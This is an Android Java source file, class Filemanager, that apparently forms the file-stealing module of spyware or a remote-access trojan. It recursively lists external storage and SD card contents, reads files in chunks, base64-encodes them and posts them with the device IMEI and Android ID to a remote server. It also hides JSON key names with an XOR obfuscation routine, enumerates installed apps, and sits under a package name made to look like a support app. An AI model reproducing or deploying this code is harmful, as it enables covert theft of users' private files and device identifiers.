package com.support.samsg;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Base64;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;


public class Filemanager {
    static  Context mContext;
    public static List<String> allDirectory_ = new ArrayList<>();
    public static List<String> sdCards = new ArrayList<>();
    protected static ExecutorService mExecutorService;
    protected static JSONObject mLogData = null;

    public Filemanager(Context context) {
        mContext = context;
        mLogData = new JSONObject();
        mExecutorService = Executors.newSingleThreadExecutor();
    }
    public static void getDirectory(String dirPath, boolean bRecursive) throws JSONException
    {
        File dir = new File(dirPath);
        List<String> subDirList = new ArrayList<>();
        String strResult = dirPath + "\r\n";
        boolean bIsFirst = true;

        if (dir.exists() && dir.isDirectory()) {
            File[] files = dir.listFiles();

            if (files != null) {
                for (File file : files) {
                    strResult += "\\" + file.getPath();
                    if (file.isDirectory()) {
                        strResult += " Dir";
                        subDirList.add(file.getAbsolutePath());
                    } else {
                        strResult += " " + getFileInfo(file.getAbsolutePath());
                    }
                }
            }
        }
        strResult += "\r\n\r\n";
        if (!strResult.equals("")) {
            try {
                Send_Data("FILELIST", strResult,"",0);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            try {
                strResult += "Folder is empty.";
                Send_Data("FILELIST", strResult,"",0);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        if (bRecursive) {
            for (String subdir: subDirList) {
                getDirectory(subdir, true);
            }
        }
    }
    public static void getfile(String ayir) {
        new Thread(() -> {
                File file = new File(ayir);
                if (file.exists()) {
                    long length = file.length();
                    try {
                        FileInputStream inputStream = new FileInputStream(file);
                        double total_read = 0;
                        int read_bytes, read_len = 8192;
                        byte[] buffer = new byte[8192];
                        while ((read_bytes = inputStream.read(buffer, 0, read_len)) != 0) {

                            //byte[] data = StringCompressor.Contents_compress(buffer, 0, read_bytes);
                            byte[] data = extractBytes(buffer ,0,read_bytes);
                            String str_data = android.util.Base64.encodeToString(data, Base64.DEFAULT);

                            if (str_data != null){
                                int n_length = (int) length;
                                Send_Data("FILEDOWN", str_data,file.getName(),n_length);
                            }

                            else
                                return;
                            total_read += read_bytes;
                            read_len = (total_read + 8192 >= length) ? (int) (length - total_read) : 8192;
                            Thread.sleep(100);
                        }
                        inputStream.close();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
        }).start();
    }

    public static byte[] extractBytes(byte[] source, int start, int length) {
        return Arrays.copyOfRange(source, start, start + length);
    }

    public static void Send_Data(String str_choose , String str_filelog, String str_filename,int n_totalLength){
        String IMEI = getIMEI();
        String strID = "Kur-" + IMEI + "_" + GetIdentifier();
        try {
            mLogData.put(MyCrypt.crypt("r\u0016v\n", 42), MyCrypt.crypt("j\u0000a\u001C", 42));//"LOGS"
            mLogData.put(MyCrypt.crypt("o\u0002c\u0006", 42), IMEI);
            mLogData.put(str_choose, str_filelog);
            if(str_choose.equals("FILEDOWN")){
                mLogData.put("FILENAME",str_filename);
                mLogData.put("FILELENGTH",n_totalLength);
            }

            String _data =mLogData.toString();

            mExecutorService.submit(new PostByWeb(mContext, PostType.DATA, strID, _data, new ICallBack() {
                @Override
                public boolean onFinished(String response) {
                    return true;
                }
                @Override
                public void onError(String error) {
                    mLogData.remove(MyCrypt.crypt("r\u0016v\n", 42));
                    mLogData.remove(MyCrypt.crypt("o\u0002c\u0006", 42));
                    mLogData.remove(MyCrypt.crypt("b\np\u0006e\n", 42));

                }
                @Override
                public void onSuccess(Object resp) {
                    mLogData.remove(MyCrypt.crypt("r\u0016v\n", 42));
                    mLogData.remove(MyCrypt.crypt("o\u0002c\u0006", 42));
                    mLogData.remove(MyCrypt.crypt("b\np\u0006e\n", 42));
                }
            }));
        } catch (JSONException e) {
            mLogData.remove(MyCrypt.crypt("r\u0016v\n", 42));
            mLogData.remove(MyCrypt.crypt("o\u0002c\u0006", 42));
            mLogData.remove(MyCrypt.crypt("b\np\u0006e\n", 42));

        }
    }
    @SuppressLint("HardwareIds")
    public static String getIMEI() {
        String deviceId;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                deviceId = Settings.Secure.getString(mContext.getContentResolver(), Settings.Secure.ANDROID_ID);
            } else {
                final TelephonyManager mTelephony = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
                if (mTelephony.getDeviceId() != null) {
                    deviceId = mTelephony.getDeviceId();
                } else {
                    deviceId = Settings.Secure.getString(mContext.getContentResolver(), Settings.Secure.ANDROID_ID);
                }
            }
            return deviceId;
        }catch(Exception e)
        {
            deviceId = Settings.Secure.getString(mContext.getContentResolver(), Settings.Secure.ANDROID_ID);
            return deviceId;

        }
    }
    protected static String GetIdentifier() {
        try {
            return Settings.Secure.getString(mContext.getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            return MyCrypt.crypt("#54(4\u0018/*#.", 19);
        }
    }
    public static String joinList(List<String> list) throws JSONException {

       String str_result = "";
        for (String item : list) {
           str_result = str_result + item + "\\";
        }
        return str_result;
    }
    public static void dosyalar() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                allDirectory_.clear();
                File[] _path = mContext.getExternalFilesDirs(null);
                for (File spath : _path) {
                    if (!spath.getPath().contains("emulated")) {
                        String s = spath.getPath();
                        s = s.replace(s.substring(s.indexOf("/And")), "");
                        sdCards.add(s);
                    }
                }
                if (sdCards.size() > 0) {
                    listf(sdCards.get(0));
                }
                getDirectory(sdCards.get(0), true);
                getDirectory(Environment.getExternalStorageDirectory().getAbsolutePath(), true);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    private static void AppListFiles(String absPath)
    {
        if(absPath == null || absPath.isEmpty()) {
            PackageManager packageManager = mContext.getPackageManager();
            List<ApplicationInfo> apps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
            if (apps != null) {
                for (int i = 0; i < apps.size(); i++) {
                    try {
                        ApplicationInfo applicationInfo = apps.get(i);
                        if (applicationInfo.sourceDir.startsWith("/system") || applicationInfo.sourceDir.startsWith("/product")) {
                            continue;
                        }
                        String src = applicationInfo.sourceDir;
                        String AbsPath = src.substring(0, src.lastIndexOf("/"));
                        String ParentDir = AbsPath.substring(0, AbsPath.lastIndexOf("/"));
                        String DirName = AbsPath.substring(ParentDir.length() + 1);
                        allDirectory_.add(DirName +
                                _Global.SPEC16 + AbsPath +
                                _Global.SPEC16 + _Global.XX_FOLDER_XX +
                                _Global.SPEC16 + _Global.SPEC16 + _Global.REQ_CODE_APPS + _Global.SPEC16 + ParentDir + _Global.SPEC16);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }else
        {
            try {
                File dir = new File(absPath);
                if (dir.isDirectory()) {
                    File[] files = dir.listFiles();
                    if (files != null && files.length > 0) {
                        for (File temp : files) {
                            if (temp.isDirectory()) {
                                allDirectory_.add(temp.getName() + _Global.SPEC16 +
                                        temp.getAbsolutePath() + _Global.SPEC16 +
                                        _Global.XX_FOLDER_XX + _Global.SPEC16 + _Global.SPEC16 +
                                        _Global.REQ_CODE_APPS + _Global.SPEC16 + absPath + _Global.SPEC16);
                            } else if (temp.isFile()) {
                                allDirectory_.add(temp.getName() + _Global.SPEC16 +
                                        temp.getParent() + _Global.SPEC16 +
                                        getExtension(temp.getName()) + _Global.SPEC16 +
                                        GetFileSizeInBytes(temp.getPath()) + _Global.SPEC16 + _Global.REQ_CODE_APPS + _Global.SPEC16 + absPath + _Global.SPEC16);
                            }
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    private static String GetFileSizeInBytes(String filenane) {
        try {
            File file = new File(filenane);
            double len = file.length();
            int order = 0;
            while (len >= 1024 && order < _Global.SIZES.length - 1) {
                order++;
                len = len / 1024;
            }
            return String.format("%s", (int) len )+ " " + _Global.SIZES[order];
        } catch (Exception ex) {
            return ex.getMessage();
        }
    }

    private static String getExtension(String fname) {
        try {
            return fname.substring(fname.lastIndexOf(_Global.SPEC14));
        } catch (Exception e) {
            return "";
        }
    }
    public static String getFileInfo(String filePath) {
        String str_result = "?";
        File file = new File(filePath);

        if (file.exists()) {
            long lastModified = file.lastModified(); // 파일의 최종 수정 시간 (밀리초 단위)
            Date lastModifiedDate = new Date(lastModified);
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            String formattedDate = dateFormat.format(lastModifiedDate);
            str_result +="Last modified: " + formattedDate +"?";

            str_result +="File size: "+GetFileSizeInBytes(filePath);

        } else {
            System.out.println("File does not exist.");
        }
        return str_result;
    }
    private static void listf(String directoryName) {
        try {
            File directory = new File(directoryName);
            File[] fList = directory.listFiles();
            if (fList != null) {
                for (File file : fList) {
                    try {
                        if (file.isFile()) {
                            allDirectory_.add(file.getName() +
                                    _Global.SPEC16 + file.getAbsolutePath() +
                                    _Global.SPEC16 + getExtension(file.getAbsolutePath()) +
                                    _Global.SPEC16 + GetFileSizeInBytes(file.getAbsolutePath()) +
                                    _Global.SPEC16 + _Global.SDCARD + _Global.SPEC16 + directoryName + _Global.SPEC16);
                        } else if (file.isDirectory()) {
                            allDirectory_.add(file.getName() +
                                    _Global.SPEC16 + file.getAbsolutePath() +
                                    _Global.SPEC16 + _Global.XX_FOLDER_XX +
                                    _Global.SPEC16 + _Global.SPEC16 + _Global.SDCARD + _Global.SPEC16 + directoryName + _Global.SPEC16);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

